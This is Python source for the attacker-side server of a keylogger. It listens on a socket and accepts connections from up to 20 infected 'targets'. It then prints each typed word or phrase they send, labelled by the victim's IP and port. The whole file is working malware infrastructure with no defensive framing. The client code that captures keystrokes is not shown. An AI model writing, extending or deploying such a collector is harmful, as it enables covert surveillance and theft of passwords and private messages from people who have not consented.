import socket
import threading, queue
import sys
from signal import signal, SIGINT
import time


class keyloggerServer:

    def __init__(self, host, port):
        self.my_socket = self.socket_config(host, int(port))
        self.targets = dict()
        self.q = queue.Queue(0) #Word and phrases

    def socket_config(self, host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(20)
        return s

    def wait_connection(self):
        try:
            while True:
                if len(self.targets) < 20: #Max targets
                    cxn, address = self.my_socket.accept()
                    self.targets[address[0]] = dict(zip(["port","cxn"], [address[1], cxn]))
                    self.recv_word(address[0])
                time.sleep(0.05)
        except Exception as err:
            print(f"ERROR: {err}")

    def recv_word(self, ip):
        try:
            word = self.targets[ip]["cxn"].recv(1024).decode("utf-8")
            word = [ip, word]
            self.q.put(word) #put word in queue
        except Exception as err:
            print(f"Target[{ip}->{self.targets[ip]['port']}]>>> {err}")
            if self.targets.get(ip, -1) != -1:
                del self.targets[ip]

    def shutdown(self, sig_recv, frame):
        for ip in self.targets:
            if self.targets.get(ip,-1) != -1:
                self.targets[ip]["cxn"].close()
                print(f"Target[{ip}->{self.targets[ip]['port']}]>>> closed")
        del self.targets
        self.my_socket.close()
        print("[-] Server Closed")
        exit(0)


def main():
    print("Ctrl-c to stop!")
    keylogger = keyloggerServer(sys.argv[1], sys.argv[2])
    signal(SIGINT, keylogger.shutdown)
    threading.Thread(target=keylogger.wait_connection, args=(), daemon=True).start() #run server
    while True:
        if not keylogger.q.empty():
            word_of = keylogger.q.get()  
            if word_of[1] == "":  #Failed Connection
                print(f"{word_of[0]}->{keylogger.targets[word_of[0]]['port']}>>> closed")
                del keylogger.targets[word_of[0]]
            else:
                threading.Thread(target=keylogger.recv_word, args=(word_of[0],), daemon=True).start() #get word or phrase from client
                print(rf"Target[{word_of[0]}->{keylogger.targets[word_of[0]]['port']}]>>> {word_of[1]}")
            time.sleep(0.05)
        time.sleep(0.05)

if __name__ == "__main__":
    try:
        main()
    except IndexError:
        print("[-] ERROR: missing IP and port. Run -> python keylogger_attacker.py <ip> <port>")
